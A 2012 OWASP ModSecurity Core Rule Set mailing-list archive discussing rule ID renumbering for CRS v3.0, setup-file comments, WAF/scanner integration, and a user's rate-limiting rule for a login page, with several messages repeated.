In-Reply-To: <3fbf20b54847484f88718b360d672fdb@mail.gmail.com>
Message-ID: <CBF4F0EC.504D3%rbarnett@trustwave.com>

I will investigate the idea of a rule mapping, but keep in mind that following -

 1.  One of our goals with the update is to make the rule accuracy better (less false positives).  So, just because a specific rule is currently a false positive and you chose to add an exception to disable it, that does not mean that you would need to keep the exception with the new version of the rule.
 2.  ModSecurity v2.7 (will be released very soon) has the new "accuracy" and "maturity" actions.  This will allow us (Trustwave) to give a relative score for each of these settings.  This will help you to decide which rules to run default or not.
 3.  As for directory structure groupings, it is my belief that all rules in the "base_rules" directory should have a very high quality of accuracy (low FP rate).  If a user wants to get more aggressive with detection, then they will be able to activate other rule files under the "experimental_rules" directory in which the accuracy/maturity values would be lower.

-Ryan

From: David Sinclair <dbsinclair at multiservice.com<mailto:dbsinclair at multiservice.com>>
Date: Wed, 6 Jun 2012 10:28:01 -0500
To: Ryan Barnett <rbarnett at trustwave.com<mailto:rbarnett at trustwave.com>>, "owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>" <owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>>
Subject: RE: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]Updating Rule IDs

I think it is a good idea to better group the rules but it will require an extensive review of rule exceptions.  If there is a mapping available from the old id to the new id for those rules that are reassigned that would be very helpful and reduce the review effort.

David B. Sinclair
Security Manager
Multi Service Corporation

+1-913-663-9474-w
+1-816-718-0449-m
dbsinclair at multiservice.com<mailto:dbsinclair at multiservice.com>

________________________________
From:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>] On Behalf Of Ryan Barnett
Sent: Wednesday, June 06, 2012 9:24 AM
To:owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]Updating Rule IDs

One of the items we are considering with the CRS v3.0 update is to start from scratch with all of the rule IDs.  We have a defined range reserved for the OWASP CRS -
https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#id

900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set
[12]<http://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project> project

The rationale for this change is to make it easier to users to do exceptions and disable groups ofrules by using SecRuleRemoveById, etc? That directive has the capability to remove ranges of rule IDs, however over the years the rule IDs were added ad-hoc and they are not properly grouped in this manner.  For instance, groupings could be something similar to this -


 *   Protocol Violation ? 900000-900099
 *   Protocol Policies - 900100?900199
 *   Cross-site Scripting - 900200?900299
 *   ?
We would give each rule group approx 100 rule IDs.  The initial number would be less than thatwhich would allow some growth.  After some analysis of the current rules, we really shouldn't ever exceed those allotments as there ends up being rule logic duplication and you just end up with bloated rule amounts.

Keep in mind that the active rule IDs were going to change a bit anyways with this update as we will be consolidating many rules into highly optimized regexes, etc..

The only concern that I have with making this move would be if users have extensively implemented exceptions based on the current rule IDs.  They would need to be aware of this when they migrate to v3.0.

Comments?

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

---------------------------------------------------------------------------------------
This email is intended solely for the use of the addressee and may
contain information that is confidential, proprietary, or both.
If you receive this email in error please immediately notify the
sender and delete the email.
---------------------------------------------------------------------------------------



________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/ad2022b9/attachment-0001.html>

From mike.cramer at gmail.com  Wed Jun  6 15:30:14 2012
From: mike.cramer at gmail.com (Michael Cramer)
Date: Wed, 6 Jun 2012 11:30:14 -0400
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread] Updating Rule IDs
In-Reply-To: <CBF4E03D.504B3%rbarnett@trustwave.com>
References: <CBF4E03D.504B3%rbarnett@trustwave.com>
Message-ID: <-7121284989596259125@unknownmsgid>

I like the idea of consolidating and making it easier to find rules. Is
there any way to map existing rule IDs to the new ones? It might allow the
change to happen without breaking so much stuff.

Sent from my iPhone

On Jun 6, 2012, at 11:24, Ryan Barnett <RBarnett at trustwave.com> wrote:

  One of the items we are considering with the CRS v3.0 update is to start
from scratch with all of the rule IDs.  We have a defined range reserved
for the OWASP CRS -
https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#id

 900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set
[12]<http://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project>
 project

 The rationale for this change is to make it easier to users to do
exceptions and disable groups of rules by using SecRuleRemoveById, etc?
That directive has the capability to remove ranges of rule IDs, however
over the years the rule IDs were added ad-hoc and they are not properly
grouped in this manner.  For instance, groupings could be something similar
to this -


   - Protocol Violation ? 900000-900099
   - Protocol Policies - 900100?900199
   - Cross-site Scripting - 900200?900299
   - ?

We would give each rule group approx 100 rule IDs.  The initial number
would be less than that which would allow some growth.  After some analysis
of the current rules, we really shouldn't ever exceed those allotments as
there ends up being rule logic duplication and you just end up with bloated
rule amounts.

 Keep in mind that the active rule IDs were going to change a bit anyways
with this update as we will be consolidating many rules into highly
optimized regexes, etc..

 The only concern that I have with making this move would be if users have
extensively implemented exceptions based on the current rule IDs.  They
would need to be aware of this when they migrate to v3.0.

 Comments?

  --
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

------------------------------
This transmission may contain information that is privileged, confidential,
and/or exempt from disclosure under applicable law. If you are not the
intended recipient, you are hereby notified that any disclosure, copying,
distribution, or use of the information contained herein (including any
reliance thereon) is STRICTLY PROHIBITED. If you received this transmission
in error, please immediately contact the sender and destroy the material in
its entirety, whether in electronic or hard copy format.

_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/85b0d84b/attachment.html>
-------------- next part --------------
A non-text attachment was scrubbed...
Name: smime.p7s
Type: application/pkcs7-signature
Size: 4828 bytes
Desc: not available
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/85b0d84b/attachment.bin>

From dbsinclair at multiservice.com  Wed Jun  6 15:28:01 2012
From: dbsinclair at multiservice.com (David Sinclair)
Date: Wed, 6 Jun 2012 10:28:01 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread]Updating Rule IDs
In-Reply-To: <CBF4E03D.504B3%rbarnett@trustwave.com>
References: <CBF4E03D.504B3%rbarnett@trustwave.com>
Message-ID: <3fbf20b54847484f88718b360d672fdb@mail.gmail.com>

I think it is a good idea to better group the rules but it will require an
extensive review of rule exceptions.  If there is a mapping available from
the old id to the new id for those rules that are reassigned that would be
very helpful and reduce the review effort.



*David B. Sinclair*

Security Manager

Multi Service Corporation



+1-913-663-9474-w

+1-816-718-0449-m

dbsinclair at multiservice.com


  ------------------------------

*From:* owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:
owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] *On Behalf Of *Ryan
Barnett
*Sent:* Wednesday, June 06, 2012 9:24 AM
*To:* owasp-modsecurity-core-rule-set at lists.owasp.org
*Subject:* [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
Thread]Updating Rule IDs



One of the items we are considering with the CRS v3.0 update is to start
from scratch with all of the rule IDs.  We have a defined range reserved
for the OWASP CRS -

https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#id



900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set
[12]<http://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project>
 project



The rationale for this change is to make it easier to users to do
exceptions and disable groups of rules by using SecRuleRemoveById, etc?
That directive has the capability to remove *ranges* of rule IDs, however
over the years the rule IDs were added ad-hoc and they are not properly
grouped in this manner.  For instance, groupings could be something similar
to this -



   - Protocol Violation ? 900000-900099
   - Protocol Policies - 900100?900199
   - Cross-site Scripting - 900200?900299
   - ?

 We would give each rule group approx 100 rule IDs.  The initial number
would be less than that which would allow some growth.  After some analysis
of the current rules, we really shouldn't ever exceed those allotments as
there ends up being rule logic duplication and you just end up with bloated
rule amounts.



Keep in mind that the active rule IDs were going to change a bit anyways
with this update as we will be consolidating many rules into highly
optimized regexes, etc..



The only concern that I have with making this move would be if users have
extensively implemented exceptions based on the current rule IDs.  They
would need to be aware of this when they migrate to v3.0.



Comments?



-- 

Ryan Barnett
Trustwave SpiderLabs

ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader


 ------------------------------

This transmission may contain information that is privileged, confidential,
and/or exempt from disclosure under applicable law. If you are not the
intended recipient, you are hereby notified that any disclosure, copying,
distribution, or use of the information contained herein (including any
reliance thereon) is STRICTLY PROHIBITED. If you received this transmission
in error, please immediately contact the sender and destroy the material in
its entirety, whether in electronic or hard copy format.


---------------------------------------------------------------------------------------
This email is intended solely for the use of the addressee and may
contain information that is confidential, proprietary, or both.
If you receive this email in error please immediately notify the
sender and delete the email.
---------------------------------------------------------------------------------------

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/2421bd19/attachment-0001.html>

From RBarnett at trustwave.com  Wed Jun  6 13:03:27 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 08:03:27 -0500
Subject: [Owasp-modsecurity-core-rule-set] Dynamic DAST/WAF Integration
Message-ID: <CBF4CD5F.50474%rbarnett@trustwave.com>

I released a blog post yesterday outlining the "Dynamic DAST/WAF Integration" concept that shows how to integrate ModSecurity with the Arachni scanner (http://arachni-scanner.com/) using the Lua API to achieve realtime virtual patching.

http://blog.spiderlabs.com/2012/06/dynamic-dastwaf-integration-realtime-virtual-patching.html

There are links in the blog post that point to the new files in the SF SVN trunk repo if you want give this a try.

Cheers.

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/21cf100b/attachment.html>

From RBarnett at trustwave.com  Wed Jun  6 17:03:39 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 12:03:39 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
 10 Setup Conf File: SecDefaultAction
In-Reply-To: <CBF502DA.50503%rbarnett@trustwave.com>
Message-ID: <CBF50352.50508%rbarnett@trustwave.com>

Updated the following section for the SecDefaultAction directive that controls the mode of operation ? either self-contained or collaborative detection.

#
# -- [[ Modes of Operation: Self-Contained vs. Collaborative Detection ]] -----------------
#
# Each detection rule uses the "block" action which will inherit the SecDefaultAction
# specified below.  Your settings here will determine which mode of operation you use.
#
# -- [[ Self-Contained Mode ]] --
# Rules inherit the "deny" disruptive action.  The first rule that matches will block.
#
# -- [[ Collaborative Detection Mode ]] --
# This is a "delayed blocking" mode of operation where each matching rule will inherit
# the "pass" action and will only contribute to anomaly scores.  Transactional blocking
# can be applied
#
# -- [[ Alert Logging Control ]] --
# You have three options -
#
# - To log to both the Apache error_log and ModSecurity audit_log file use: "log"
# - To log *only* to the ModSecurity audit_log file use: "nolog,auditlog"
# - To log *only* to the Apache error_log file use: "log,noauditlog"
#
# Ref: http://blog.spiderlabs.com/2010/11/advanced-topic-of-the-week-traditional-vs-anomaly-scoring-detection-modes.html
# Ref: https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#SecDefaultAction
#
SecDefaultAction "phase:2,deny,log"

For discussion purposes, regarding "disruptive actions", I believe that we should consider responding differently to malicious transactions.  Issuing HTTP 4xx level response codes are of no help to non-malicious end users who have innocently triggered an alert and they also "tip the hand" a bit to malicious users that there is some type of separate security layer in place.  I am a proponent of trying to make a WAF deployment transparent to the user ? meaning that they can decipher when ModSecurity has triggered an alert vs. if the application itself issues some type of violation.

For example ? oftentimes when an invalid request is received, applications will issue 302 Redirects back to the previous page or a login page.  I would like to prose the idea of using the redirect action here within the SecDefaultAction setting and letting the ModSec Admin choose where to redirect users too when an alert is triggered.  Example:

SecDefaultAction "phase:2,redirect:http://www.example.com/login.php,log"

Comments?

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/6b40b3c3/attachment.html>

From RBarnett at trustwave.com  Wed Jun  6 16:53:07 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 11:53:07 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
 10 Setup Conf File: SecComponentSignature
In-Reply-To: <CBF50149.504F5%rbarnett@trustwave.com>
Message-ID: <CBF502DA.50503%rbarnett@trustwave.com>

Updated the following section to better describe its purpose and included a Ref link.

#
# -- [[ Rule Version ]] -------------------------------------------------------------------
#
# Rule version data is added to the "Producer" line of Section H of the Audit log:
#
# - Producer: ModSecurity for Apache/2.7.0-rc1 (http://www.modsecurity.org/); OWASP_CRS/2.2.4.
#
# Ref: https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#SecComponentSignature
#
SecComponentSignature "[% PRODUCT %]/[% VERSION %]"

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/3198a335/attachment.html>

From RBarnett at trustwave.com  Wed Jun  6 16:50:50 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 11:50:50 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
 10 Setup Conf File: Reference Recommended Base Config
In-Reply-To: <-7121284989596259125@unknownmsgid>
Message-ID: <CBF50149.504F5%rbarnett@trustwave.com>

I am beginning to update the modsecurity_crs_10_setup.conf file contents.  I will be sending out each section as I update it for feedback.

The first section I am adding to the beginning of this file is a reference to the recommended base configuration file that comes with the ModSecurity source archive.  We have found that many users are not using this file and there are some impacts to the rules. For example, if you have not defined SecRequestBodyAccess On, then the CRS rules will not be able to inspect request body ARGS.

I added the following comment text at the beginning of the file to ensure that CRS users are aware of the recommended base config file.

#
# -- [[ Recommended Base Configuration ]] -------------------------------------------------
#
# The configuration directives/settings in this file are used to control
# the OWASP ModSecurity CRS. These settings do **NOT** configure the main
# ModSecurity settings such as:
#
# - SecRuleEngine
# - SecRequestBodyAccess
# - SecAuditEngine
# - SecDebugLog
#
# You should use the modsecurity.conf-recommended file that comes with the
# ModSecurity source code archive.
#
# Ref: http://mod-security.svn.sourceforge.net/viewvc/mod-security/m2/trunk/modsecurity.conf-recommended
#

Comments welcome.

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/a992ebc4/attachment-0001.html>

From xcmffl at gmail.com  Wed Jun  6 00:58:08 2012
From: xcmffl at gmail.com (leon xu)
Date: Wed, 6 Jun 2012 08:58:08 +0800
Subject: [Owasp-modsecurity-core-rule-set] varible in dos rule exipired
	earlier then expected
Message-ID: <CA+yt8+=XyJ1-urHL+EEp1sbNjR5DoqCDvdoeJzkrjOGZDywKSg@mail.gmail.com>

Hello, everyone

    I use modsecurity 2.6 protect against dos attack for some specific
pages.
This is the  rule. I test it in my box, it works. But when in some
product *environment(large
number of  *concurrent connections in worker MPM)*, it failed.*
*In the early time I use expiredvar:dos_block every 1800 seconds, as the
modsecurity docs suggests. I found the var "dos_block" expired within 1-10
second(**I dump the resource db),n**ot 1800. So I changed it with
*deprecatevar. But
it does not works too.
Does it because of the concurrent problem?

Thanks.


----------------------------------------------------------------

SecRule REQUEST_URI "^/login.php" \

"phase:1,capture,t:lowercase,t:urlDecodeUni,pass,nolog,setvar:tx.dos_uri=%{TX.1},skip:1"
SecAction "phase:1,pass,nolog,skipAfter:Dos_Marker"





SecAction "phase:1,pass,nolog,t:none,setvar:tx.real_ip=%{REMOTE_ADDR}"
SecAction "phase:1,nolog,initcol:resource='%{tx.real_ip}/'"



SecRule RESOURCE:SHOULD_LOG "@eq 1"
"phase:1,pass,nolog,setvar:resource.should_log=0,skip:2"

#already blocked, nolog here
SecRule RESOURCE:DOS_BLOCKED "@eq 1" \

"phase:1,deny,nolog,severity:'2',status:403,deprecatevar:resource.dos_blocked=1/1800,skipAfter:Dos_Marker"

SecAction "phase:1,pass,nolog,skip:1"

#log version, logdata is real client ip
SecRule RESOURCE:DOS_BLOCKED "@eq 1" \

 "phase:1,deny,log,auditlog,severity:'2',msg:'99010',id:'99010001',tag:'9901',status:403,deprecatevar:resource.dos_blocked=1/1800,logdata:%{tx.real_ip},skipAfter:Dos_Marker"

#counter++
SecAction
"phase:1,nolog,setvar:resource.dos_request_counter=+1,deprecatevar:resource.dos_request_counter=10/60"


# if counter == max then block
SecRule RESOURCE:DOS_REQUEST_COUNTER "@ge 10" \

"phase:5,nolog,setvar:resource.dos_request_counter=0,setvar:resource.dos_blocked=1,setvar:resource.should_log=1"

SecMarker Dos_Marker
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/1dbe15ad/attachment-0002.html>

From RBarnett at trustwave.com  Wed Jun  6 14:23:58 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 09:23:58 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
	Updating Rule IDs
Message-ID: <CBF4E03D.504B3%rbarnett@trustwave.com>

One of the items we are considering with the CRS v3.0 update is to start from scratch with all of the rule IDs.  We have a defined range reserved for the OWASP CRS -
https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#id

900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set [12]<http://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project> project

The rationale for this change is to make it easier to users to do exceptions and disable groups of rules by using SecRuleRemoveById, etc? That directive has the capability to remove ranges of rule IDs, however over the years the rule IDs were added ad-hoc and they are not properly grouped in this manner.  For instance, groupings could be something similar to this -


 *   Protocol Violation ? 900000-900099
 *   Protocol Policies - 900100?900199
 *   Cross-site Scripting - 900200?900299
 *   ?

We would give each rule group approx 100 rule IDs.  The initial number would be less than that which would allow some growth.  After some analysis of the current rules, we really shouldn't ever exceed those allotments as there ends up being rule logic duplication and you just end up with bloated rule amounts.

Keep in mind that the active rule IDs were going to change a bit anyways with this update as we will be consolidating many rules into highly optimized regexes, etc..

The only concern that I have with making this move would be if users have extensively implemented exceptions based on the current rule IDs.  They would need to be aware of this when they migrate to v3.0.

Comments?

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/bb9e4982/attachment-0002.html>

From mark at intcom.nl  Wed Jun  6 19:50:24 2012
From: mark at intcom.nl (Mark Boos (IntCom))
Date: Wed, 6 Jun 2012 21:50:24 +0200
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
	Thread]Updating Rule IDs
In-Reply-To: <CBF4F0EC.504D3%rbarnett@trustwave.com>
Message-ID: <NDBBLMJIGLJAFKPADIIJAEIGHNAA.mark@intcom.nl>

To me, it sounds like a database / categorization problem which you want to
solve via id's. Is there no other way to add a category indication ? In my
field, customers want to order member numbers to the alphabet. It's ok to do
that when you start, but the next new member that comes gets max_id+1
regardless of his last name.

Also, it sounds like a lot of work to categorize every rule to new numbers,
also in the future.

And lastly, indeed; for the people who make exceptions based on the current
rule id's, this will cause a lot lot of problems for them.

Regards
Mark

-----Oorspronkelijk bericht-----
Van: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
[mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org]Namens Ryan
Barnett
Verzonden: woensdag 6 juni 2012 17:40
Aan: David Sinclair; owasp-modsecurity-core-rule-set at lists.owasp.org
Onderwerp: Re: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
Thread]Updating Rule IDs


I will investigate the idea of a rule mapping, but keep in mind that
following -
One of our goals with the update is to make the rule accuracy better (less
false positives).  So, just because a specific rule is currently a false
positive and you chose to add an exception to disable it, that does not mean
that you would need to keep the exception with the new version of the rule.
ModSecurity v2.7 (will be released very soon) has the new "accuracy" and
"maturity" actions.  This will allow us (Trustwave) to give a relative score
for each of these settings.  This will help you to decide which rules to run
default or not.
As for directory structure groupings, it is my belief that all rules in the
"base_rules" directory should have a very high quality of accuracy (low FP
rate).  If a user wants to get more aggressive with detection, then they
will be able to activate other rule files under the "experimental_rules"
directory in which the accuracy/maturity values would be lower.


-Ryan


From: David Sinclair <dbsinclair at multiservice.com>
Date: Wed, 6 Jun 2012 10:28:01 -0500
To: Ryan Barnett <rbarnett at trustwave.com>,
"owasp-modsecurity-core-rule-set at lists.owasp.org"
<owasp-modsecurity-core-rule-set at lists.owasp.org>
Subject: RE: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
Thread]Updating Rule IDs



I think it is a good idea to better group the rules but it will require an
extensive review of rule exceptions.  If there is a mapping available from
the old id to the new id for those rules that are reassigned that would be
very helpful and reduce the review effort.

David B. Sinclair
Security Manager
Multi Service Corporation

+1-913-663-9474-w
+1-816-718-0449-m
dbsinclair at multiservice.com




From:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
[mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf
Of Ryan Barnett
Sent: Wednesday, June 06, 2012 9:24 AM
To:owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
Thread]Updating Rule IDs

One of the items we are considering with the CRS v3.0 update is to start
from scratch with all of the rule IDs.  We have a defined range reserved for
the OWASP CRS -
https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Referenc
e_Manual#id

900,000?999,999: reserved for the OWASP ModSecurity Core Rule Set
[12] project

The rationale for this change is to make it easier to users to do exceptions
and disable groups ofrules by using SecRuleRemoveById, etc? That directive
has the capability to remove ranges of rule IDs, however over the years the
rule IDs were added ad-hoc and they are not properly grouped in this manner.
For instance, groupings could be something similar to this -

Protocol Violation ? 900000-900099
Protocol Policies - 900100?900199
Cross-site Scripting - 900200?900299
?
We would give each rule group approx 100 rule IDs.  The initial number would
be less than thatwhich would allow some growth.  After some analysis of the
current rules, we really shouldn't ever exceed those allotments as there
ends up being rule logic duplication and you just end up with bloated rule
amounts.

Keep in mind that the active rule IDs were going to change a bit anyways
with this update as we will be consolidating many rules into highly
optimized regexes, etc..

The only concern that I have with making this move would be if users have
extensively implemented exceptions based on the current rule IDs.  They
would need to be aware of this when they migrate to v3.0.

Comments?

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader




This transmission may contain information that is privileged, confidential,
and/or exempt from disclosure under applicable law. If you are not the
intended recipient, you are hereby notified that any disclosure, copying,
distribution, or use of the information contained herein (including any
reliance thereon) is STRICTLY PROHIBITED. If you received this transmission
in error, please immediately contact the sender and destroy the material in
its entirety, whether in electronic or hard copy format.
----------------------------------------------------------------------------
-----------
This email is intended solely for the use of the addressee and may
contain information that is confidential, proprietary, or both.
If you receive this email in error please immediately notify the
sender and delete the email.
----------------------------------------------------------------------------
-----------





This transmission may contain information that is privileged, confidential,
and/or exempt from disclosure under applicable law. If you are not the
intended recipient, you are hereby notified that any disclosure, copying,
distribution, or use of the information contained herein (including any
reliance thereon) is STRICTLY PROHIBITED. If you received this transmission
in error, please immediately contact the sender and destroy the material in
its entirety, whether in electronic or hard copy format.


From RBarnett at trustwave.com  Wed Jun  6 13:03:27 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 6 Jun 2012 08:03:27 -0500
Subject: [Owasp-modsecurity-core-rule-set] Dynamic DAST/WAF Integration
Message-ID: <CBF4CD5F.50474%rbarnett@trustwave.com>

I released a blog post yesterday outlining the "Dynamic DAST/WAF Integration" concept that shows how to integrate ModSecurity with the Arachni scanner (http://arachni-scanner.com/) using the Lua API to achieve realtime virtual patching.

http://blog.spiderlabs.com/2012/06/dynamic-dastwaf-integration-realtime-virtual-patching.html

There are links in the blog post that point to the new files in the SF SVN trunk repo if you want give this a try.

Cheers.

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120606/21cf100b/attachment-0003.html>

From mark at intcom.nl  Wed Jun  6 19:50:24 2012
From: mark at intcom.nl (Mark Boos (IntCom))
Date: Wed, 6 Jun 2012 21:50:24 +0200
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
	Thread]Updating Rule IDs
In-Reply-To: <CBF4F0EC.504D3%rbarnett@trustwave.com>
Message-ID: <NDBBLMJIGLJAFKPADIIJAEIGHNAA.mark@intcom.nl>

To me, it sounds like a database / categorization problem which you want to
solve via id's. Is there no other way to add a category indication ? In my
field, customers want to order member numbers to the alphabet. It's ok to do
that when you start, but the next new member that comes gets max_id+1
regardless of his last name.

Also, it sounds like a lot of work to categorize every rule to new numbers,
also in the future.

And lastly, indeed; for the people who make exceptions based on the current
rule id's, this will cause a lot lot of problems for them.

Regards
Mark

-----Oorspronkelijk bericht-----
Van: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
[mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org]Namens Ryan
Barnett
Verzonden: woensdag 6 juni 2012 17:40
Aan: David Sinclair; owasp-modsecurity-core-rule-set at lists.owasp.org
Onderwerp: Re: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
Thread]Updating Rule IDs


I will investigate the idea of a rule mapping, but keep in mind that
following -
One of our goals with the update is to make the rule accuracy better (less
false positives).  So, just because a specific rule is currently a false
positive and you chose to add an exception to disable it, that does not mean
that you would need to keep the exception with the new version of the rule.
ModSecurity v2.7 (will be released very soon) has the new "accuracy" and
"maturity" actions.  This will allow us (Trustwave) to give a relative score
for each of these settings.  This will help you to decide which rules to run
default or not.
As for directory structure groupings, it is my belief that all rules in the
"base_rules" directory should have a very high quality of accuracy (low FP
rate).  If a user wants to get more aggressive with detection, then they
will be able to activate other rule files under the "experimental_rules"
